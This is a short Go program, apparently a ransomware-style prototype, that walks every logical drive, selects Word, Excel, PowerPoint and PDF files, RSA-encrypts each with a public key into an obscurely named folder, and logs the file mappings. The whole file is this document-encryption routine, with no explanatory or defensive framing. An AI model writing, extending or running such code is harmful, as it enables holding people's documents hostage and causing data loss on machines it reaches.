package main

import (
	"fmt"
	Imon "github.com/0opslab/monsoon"
	"os"
	"path"
	"strings"
	"time"
)

func StringsContains(array []string, val string) (index int) {
	index = -1
	for i := 0; i < len(array); i++ {
		if array[i] == val {
			index = i
			return
		}
	}
	return
}
func main() {
	logic := Imon.GetLogicalDrives()
	suffixs := []string{".doc", ".docx", ".xls", ".ppt", ".xlsx", ".pptx", ".pdf"};
	basePath := logic[len(logic)-1] + "/8aef9e669"
	os.Mkdir(basePath, os.ModePerm)
	handler := func(fileName string) {
		if (Imon.IsFile(fileName) && StringsContains(suffixs, path.Ext(fileName)) > -1) {
			sha, _ := Imon.Sha256File(fileName)
			rsaFile := strings.ReplaceAll(basePath+"/"+sha, "\\", "/")
			if (Imon.FileIsExist(rsaFile)) {
				return
			}
			rest := fmt.Sprintf("('%s'->'%s')\n", fileName, rsaFile)
			Imon.WriteString(basePath+"/rsainfo", rest)
			go func() {
				_, e := Imon.RsaEncryptFileWithPublic(fileName, rsaFile)
				if e != nil {
					fmt.Println(e)
				}
			}()
		}
	}

	for _, v := range Imon.GetLogicalDrives() {
		Imon.WalkDirFilesHandler(v+"/", handler)
	}
	time.Sleep(24 * time.Hour)
}
